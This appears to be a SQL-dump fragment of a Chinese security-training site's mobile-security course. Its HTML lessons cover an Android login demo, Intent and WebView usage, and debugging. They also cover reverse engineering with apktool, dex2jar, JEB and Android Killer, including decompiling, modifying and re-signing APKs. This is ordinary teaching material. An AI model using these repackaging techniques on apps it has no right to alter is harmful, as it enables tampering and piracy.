<b>webView</b>.loadData(jstmp,<b>\"text/html\"</b>,<b>null</b>);<br>\r\n<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>else<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </b>{<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>webView</b>.loadData(js,<b>\"text/html\"</b>,<b>null</b>);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>this</b>.write(jsfile,js);<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Toast.<i>makeText</i>(getApplicationContext(),<b>\"</b><b>用户名:\"</b>+<b>username</b>+<b>\"</b><b>密码:\"</b>+<b>password</b>,Toast.<b><i>LENGTH_SHORT</i></b>).show();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //打印信息<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });<br>\r\n<br>\r\n&nbsp;&nbsp;&nbsp; }<br>\r\n}<o:p></o:p></pre><p>&nbsp;</p><p>&nbsp;</p><p>这里使用了Intent来从第一个Activity传送到第二个activity，那Intent究竟是什么东西，这里介绍下：</p><p>Intent 是 Android 中的各个组件之间交互的一种重要方式，它可以用来启动 Activity、Service 和\r\nBroadcastReceiver，还可以在不同组件之间传递数据。</p><p>Intent用法实例</p><p>1.无参数Activity跳转</p><p>Intent&nbsp;it&nbsp;=&nbsp;new&nbsp;Intent(Activity.Main.this,&nbsp;Activity2.class);</p><p>startActivity(it);&nbsp;&nbsp;</p><p>2.向下一个Activity传递数据（使用Bundle和Intent.putExtras）</p><p>Intent&nbsp;it&nbsp;=&nbsp;new&nbsp;Intent(Activity.Main.this,&nbsp;Activity2.class);</p><p>Bundle&nbsp;bundle=new&nbsp;Bundle();</p><p>bundle.putString(\"name\",&nbsp;\"This&nbsp;is&nbsp;from&nbsp;MainActivity!\");</p><p>it.putExtras(bundle);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p>startActivity(it);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p>对于数据的获取可以采用：</p><p>Bundle&nbsp;bundle=getIntent().getExtras();</p><p>String&nbsp;name=bundle.getString(\"name\");</p><p>&nbsp;</p><p>3.向上一个Activity返回结果（使用setResult，针对</p><p>startActivityForResult(it,REQUEST_CODE)启动的Activity）</p><p>Intent&nbsp;intent=getIntent();</p><p>Bundle&nbsp;bundle2=new&nbsp;Bundle();</p><p>bundle2.putString(\"name\",&nbsp;\"This&nbsp;is&nbsp;from&nbsp;ShowMsg!\");</p><p>intent.putExtras(bundle2);</p><p>setResult(RESULT_OK,&nbsp;intent);</p><p>4.回调上一个Activity的结果处理函数（onActivityResult）</p><p>@Override</p><p>protected&nbsp;void&nbsp;onActivityResult(int&nbsp;requestCode,&nbsp;int&nbsp;resultCode,&nbsp;Intent&nbsp;data)&nbsp;{</p><p>&nbsp;&nbsp;&nbsp;&nbsp;super.onActivityResult(requestCode,&nbsp;resultCode,&nbsp;data);</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(requestCode==REQUEST_CODE){</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(resultCode==RESULT_CANCELED)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setTitle(\"cancle\");</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if&nbsp;(resultCode==RESULT_OK)&nbsp;{</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;temp=null;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bundle&nbsp;bundle=data.getExtras();</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(bundle!=null)&nbsp;&nbsp;&nbsp;temp=bundle.getString(\"name\");</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setTitle(temp);</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p><p>&nbsp;&nbsp;&nbsp;&nbsp;}</p><p>这里也用到了webview，简单介绍下webview的使用。</p><p>1.首先通过findViewById获取WebView实例；</p><p>2.获取WebSetting，通过webView.getSettings（）；</p><p>3.webView.loadUrl(\"\");</p><p>4.加入网络权限。</p><p></p><p>&nbsp;</p><p><br></p>',1,'http://oda8mr8yr.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.jpeg','index.alauda.cn/dubuqingfeng/docker-web-game:latest','2016-10-31 11:25:53',1,NULL,'<p>查看课程报告</p>',0,''),(93,'移动安全基础课程训练五','移动安全基础课程训练开发篇','<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Android开发五</p><p>一.调试</p><p>Android studio调试和其他IDE类似，下面介绍下.</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%935.1.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>对着要调试的行单击左键下断点。</p><p>然后开启Bluestacks.</p><p>再点击菜单栏中的RUN-&gt;DEBUG</p><p><v:shape id=\"图片_x0020_2\" o:spid=\"_x0000_i1030\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:480pt;\r\n height:377.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\7UDNFE4RLF1%5bBA~3U%7dMHWYO.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%935.2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>选中Bluestack模拟器选OK.</p><p><v:shape id=\"图片_x0020_3\" o:spid=\"_x0000_i1029\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:541.5pt;\r\n height:101.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\~%5dM(_4%25M)L_V__%25XYXS7RNL.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%935.3.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>勾选proceed withou instant run忽略安装4.4的sdk.</p><p><v:shape id=\"图片_x0020_4\" o:spid=\"_x0000_i1028\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:759pt;\r\n height:491.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\D2%60O%60RV%5dJC%7dA6%5d%7dA78O1~S1.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%935.4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>输入用户名和密码后按登录</p><p><v:shape id=\"图片_x0020_5\" o:spid=\"_x0000_i1027\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:759pt;\r\n height:491.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\NQM15HR2XUQ3LI%7d@RK@D_)G.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%935.5.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>点击显示</p><p>这时触发了onClickLister监听器，android studio的debug窗可以看到数据。</p><p><v:shape id=\"图片_x0020_7\" o:spid=\"_x0000_i1026\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:802.5pt;\r\n height:396.75pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\)WKG491CVENVN%5dFZ933%5d4YF.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image012.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%935.6.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>单步跟踪和进入函数和跳出</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%935.7.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>这里添加变量查看窗重点查看关心的变量。</p><p><br></p>',1,'http://oda8mr8yr.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.jpeg','index.alauda.cn/dubuqingfeng/docker-web-game:latest','2016-10-31 11:26:13',1,NULL,'<p>开发篇所有源码在网盘demo.zip中</p><p>链接：http://pan.baidu.com/s/1nvg1Lc1&nbsp;</p><p>密码：lye3</p><p><br></p>',0,''),(94,'移动安全基础课程训练六','移动安全基础课程训练逆向篇','<p>Android逆向一</p><h3>一.apktool 的使用</h3><p><a href=\"https://ibotpeaches.github.io/Apktool/\" target=\"http://www.jianshu.com/p/_blank\">Apktool</a>用来反编译Android的Apk文件，最大程度的还原apk中的manifest文件和资源文件\r\n还可以将反编译之后的apk重新打包成apk文件，但需要重新签名，才能安装使用</p><p>使用详解</p><p>反编译APK文件&nbsp; apktool d test.apk</p><p>$ apktool d test.apk</p><p>I: Using Apktool 2.2.0 on test.apk</p><p>I: Loading resource table...</p><p>I: Decoding AndroidManifest.xml with\r\nresources...</p><p>I: Loading resource table from file: 1.apk</p><p>I: Regular manifest package...</p><p>I: Decoding file-resources...</p><p>I: Decoding values */* XMLs...</p><p>I: Baksmaling classes.dex...</p><p>I: Copying assets and libs...</p><p>I: Copying unknown files...</p><p>I: Copying original files...</p><p>会生成一个和apk同名为文件夹&nbsp; </p><p>AndroidManifest.xml</p><p>apktool.yml</p><p>assets/</p><p>original/</p><p>res/</p><p>smali/</p><p>然后就可以查看manifest文件和资源文件</p><p>apk重新打包 apktool b test</p><p>想把反编译之后的apk重新打包成一个apk文件，执行上面的命令之后，会在原文件夹中生成两个文件夹 build/ dist/ 在dist中有重新生成的apk文件，生成的apk文件需要重新签名</p><p>&nbsp;</p><p>二.Apk反编译工具-dex2jar</p><p>&nbsp; 可以使用dex2-jar 和 工具 jd-gui配合进行apk的反编译和查看工作&nbsp;\r\n</p><p>&nbsp;下载之后分别解压到&nbsp; 对应的文件目录</p><p>&nbsp; apk本身就是一个压缩文件，通过rar或zip工具将apk中的classes.dex文件解压到 dex2-jar的目录下面&nbsp; cd 到\r\ndex2-jar 目录，使用命令 d2j-dex2jar.bat(windows)\r\nd2j-dex2jar.sh(linux)执行完命令&nbsp; 之后，会生成一个\r\nclasses-dex2jar.jar 文件 ,</p><p>&nbsp; 然后我们会使用到 jd-gui工具，本事是一个可执行文件，windows下双击就可以打开，然后打开上面&nbsp; 生成的classes-dex2jar.jar文件，就可以查看对应的java代码，当然如果代码已经进行了混淆，代码有可能&nbsp; 无法查看，请知悉&nbsp;</p><p>三.jeb的使用</p><p>JEB是一个功能强大的为安全专业人士设计的Android应用程序的反编译工具。用于逆向工程或审计APK文件，可以提高效率减少许多工程师的分析时间。</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"_x0000_i1035\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:475.5pt;height:269.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:href=\"file:///C:\\Users\\User\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\7~FB~Z59KUOA_)W_UEE%5b~$D.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%936.1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>文件-&gt;打开-&gt;选择文件路径，可以是apk和jar包。</p><p><v:shape id=\"_x0000_i1034\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:485.25pt;\r\n height:275.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:href=\"file:///C:\\Users\\User\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\CTZ$Z%25YYGF5SQXX2E$WQH9O.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%936.2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>选择Bytecode，对右侧bytecode中右键Decompile进行反编译变为java代码。</p><p>四.androidkiller的使用</p><p>Android Killer 是一款可视化的安卓应用逆向工具，集Apk反编译、Apk打包、Apk签名，编码互转，ADB通信（应用安装-卸载-运行-设备文件管理）等特色功能于一 身，支持logcat日志输出，语法高亮，基于关键字（支持单行代码或多行代码段）项目内搜索，可自定义外部工具；吸收融汇多种工具功能与特点，打造一站\r\n式逆向工具操作体验，大大简化了用户在安卓应用/游戏修改过程中的各类繁琐工作。 主要功能： \r\n1、可视化、全自动的反编译、编译、签名；支持批量编译APK。 \r\n2、以树形目录管理反编译出的Apk源码文件，浏览、打开、编辑、都可以统一在软件中实现，不同项目间可以自由切换，方便快捷。\r\n\r\n3、自动识别图像资源，并提供该类资源的快捷替换功能，方便修改这类图片资源。 \r\n4、内置代码编辑器，支持包含（但不限于）.samli、.xml、.html等各类格式文件的语法高亮显示，根据 smali文件格式的自动匹配相应语法；同时支持使用系统编辑器来编辑代码文件。 \r\n5、内置基于文件内容的单行或多行代码关键字搜索、可显示无穷多个搜索结果以标签的形式分门别类；可指定搜索范围（整个项目或在指定的文件或文件夹中搜索）、大小写，编码类型；从此无需再借助其他工具，即可轻松的完成搜索任务。 \r\n6、内嵌Unicode、UTF8、ANSI编码互转工具，方便硬编码文字的检索以及相关汉化类修改。 \r\n7、内置Log等调试工具，方便应用进程、logcat输出查看等进阶操作，监测修改apk的运行状况，以助于分析和查找错误 \r\n8、内置ADB功能，包括使用ADB向设备（或模拟器）安装、卸载、运行修改后的apk，进行测试，并可管理所连接设备的存储文件（包括系统以及用户文件） \r\n9、所有操作步骤、结果都会显示在日志窗口，方便查看。 \r\n10、默认支持记事本、计算器等小工具，开放设置接口可根据本人需要自定义外部工具，满足个性化需求。 </p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%936.3.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>\r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1033\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:486.75pt;\r\n height:363pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:href=\"http://attach.52pojie.cn/forum/201501/09/200627twzett3cv20c3950.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%936.4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>\r\n\r\n<v:shape id=\"图片_x0020_2\" o:spid=\"_x0000_i1032\" type=\"#_x0000_t75\" alt=\"IMG_257\" style=\"width:492pt;\r\n height:348.75pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:href=\"http://attach.52pojie.cn/forum/201501/09/200823hq8owm6llwixllbg.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\" alt=\"IMG_257\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%936.5.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape o:spid=\"_x0000_i1032\" type=\"#_x0000_t75\" alt=\"IMG_257\" style=\"width:492pt;\r\n height:348.75pt;visibility:visible;mso-wrap-style:square\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:href=\"http://attach.52pojie.cn/forum/201501/09/200823hq8owm6llwixllbg.png\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%936.6.png\" class=\"\"><br></v:imagedata></v:shape></p><p>\r\n\r\n<v:shape id=\"图片_x0020_4\" o:spid=\"_x0000_i1030\" type=\"#_x0000_t75\" alt=\"IMG_259\" style=\"width:485.25pt;\r\n height:235.5pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\" o:href=\"http://attach.52pojie.cn/forum/201501/10/091733kf3i0s59vfd593yt.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image012.jpg\" alt=\"IMG_259\"></v:imagedata></v:shape></p><p>\r\n\r\n<v:shape id=\"图片_x0020_5\" o:spid=\"_x0000_s1026\" type=\"#_x0000_t75\" alt=\"IMG_260\" style=\"width:540pt;height:540pt;visibility:visible;\r\n mso-wrap-style:square;mso-left-percent:-10001;mso-top-percent:-10001;\r\n mso-position-horizontal:absolute;mso-position-horizontal-relative:char;\r\n mso-position-vertical:absolute;mso-position-vertical-relative:line;\r\n mso-left-percent:-10001;mso-top-percent:-10001\">\r\n \r\n \r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image013.gif\" alt=\"IMG_260\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%936.7.png\" style=\"line-height: 1; max-width: 100%;\"></v:shape></p><p><v:shape o:spid=\"_x0000_s1026\" type=\"#_x0000_t75\" alt=\"IMG_260\" style=\"width:540pt;height:540pt;visibility:visible;\r\n mso-wrap-style:square;mso-left-percent:-10001;mso-top-percent:-10001;\r\n mso-position-horizontal:absolute;mso-position-horizontal-relative:char;\r\n mso-position-vertical:absolute;mso-position-vertical-relative:line;\r\n mso-left-percent:-10001;mso-top-percent:-10001\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%936.8.png\"><br></v:shape></p><p><v:shape o:spid=\"_x0000_s1026\" type=\"#_x0000_t75\" alt=\"IMG_260\" style=\"width:540pt;height:540pt;visibility:visible;\r\n mso-wrap-style:square;mso-left-percent:-10001;mso-top-percent:-10001;\r\n mso-position-horizontal:absolute;mso-position-horizontal-relative:char;\r\n mso-position-vertical:absolute;mso-position-vertical-relative:line;\r\n mso-left-percent:-10001;mso-top-percent:-10001\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%936.9.png\"><br></v:shape></p><p><v:shape o:spid=\"_x0000_s1026\" type=\"#_x0000_t75\" alt=\"IMG_260\" style=\"width:540pt;height:540pt;visibility:visible;\r\n mso-wrap-style:square;mso-left-percent:-10001;mso-top-percent:-10001;\r\n mso-position-horizontal:absolute;mso-position-horizontal-relative:char;\r\n mso-position-vertical:absolute;mso-position-vertical-relative:line;\r\n mso-left-percent:-10001;mso-top-percent:-10001\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%936.10.png\"><br></v:shape></p><p><br></p>',1,'http://oda8mr8yr.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.jpeg','index.alauda.cn/dubuqingfeng/docker-web-game:latest','2016-10-31 11:26:45',1,NULL,'<p>查看报告</p>',0,''),(95,'移动安全基础课程训练七','移动安全基础课程训练逆向篇','<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Android逆向二</p><p>一．Eclipse+ADT环境搭建</p><p>1.第一步，安装最新版Eclipse for JAVA EE版本。</p><p>2.第二步，Help-&gt;Install new software...</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%937.1.png\" style=\"line-height: 1; max-width: 100%;\"></p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1033\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:677.25pt;height:546pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\G6S)Q2TIP%5bD$D0V_YT4%5dZWW.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\" alt=\"IMG_256\"></v:imagedata></v:shape></v:shapetype></p><p>选择Add操作，下一步：</p><p><v:shape id=\"图片_x0020_2\" o:spid=\"_x0000_i1032\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:359.25pt;\r\n height:143.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\45%25HUO1QG7BYXSN2WSXK1_D.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%937.2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>选择ADT-23.07.zip后点OK</p><p><v:shape id=\"图片_x0020_3\" o:spid=\"_x0000_i1031\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:677.25pt;\r\n height:546pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\KVH%60DD20BININ%7bS7Z5@929C.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%937.3.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>选中Select\r\nAll,再点Next</p><p><v:shape id=\"图片_x0020_4\" o:spid=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:414.75pt;height:334.5pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%937.4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape o:spid=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:414.75pt;height:334.5pt;visibility:visible;\r\n mso-wrap-style:square\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%937.5.png\"><br></v:imagedata></v:shape></p><p><v:shape o:spid=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:414.75pt;height:334.5pt;visibility:visible;\r\n mso-wrap-style:square\"><v:imagedata 